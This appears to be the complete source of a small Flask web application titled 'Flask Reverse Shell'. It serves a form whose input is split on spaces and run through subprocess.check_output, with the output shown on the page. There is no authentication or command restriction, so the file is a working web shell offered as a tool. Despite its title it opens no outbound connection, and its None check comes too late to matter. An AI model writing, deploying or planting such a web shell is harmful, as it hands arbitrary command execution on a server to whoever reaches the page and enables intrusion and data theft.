from flask import Flask, request, render_template_string
import subprocess

app = Flask(__name__)


html = """

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Flask Reverse Shell</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css"
        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
</head>

<body>

    <div class="container">
        <h1>Flask Reverse Shell</h1>
        <form method="post" action="/">
            <div class="form-group">
              <label for="exampleFormControlTextarea1">Command</label>
              <input value="{{ cmd }}" class="form-control" id="exampleFormControlTextarea1" name="cmd" rows="3"></input>
            </div>
            <div class="form-group">
                <button type="submit" class="btn btn-primary">Execute</button>
            </div>
          </form>
        <code>
        {% for line in command_result %}
            <p style="margin-bottom: 0">{{line}}</p>
        {% endfor %}
    </code>
    </div>

</body>

</html>

"""

@app.route("/", methods=["GET", "POST"])
def hello_world():

    if request.method == "GET":
        return render_template_string(html, command_result="Command result here...", cmd="")
    if request.method == "POST":
        cmd = request.form.get('cmd')
        cmd = cmd.split(" ")
        if cmd is not None:
            result = subprocess.check_output(cmd).decode('utf-8').split('\n')
            return render_template_string(html, command_result=result, cmd=" ".join(cmd))
        return render_template_string(html, command_result="Command result here...", cmd="")
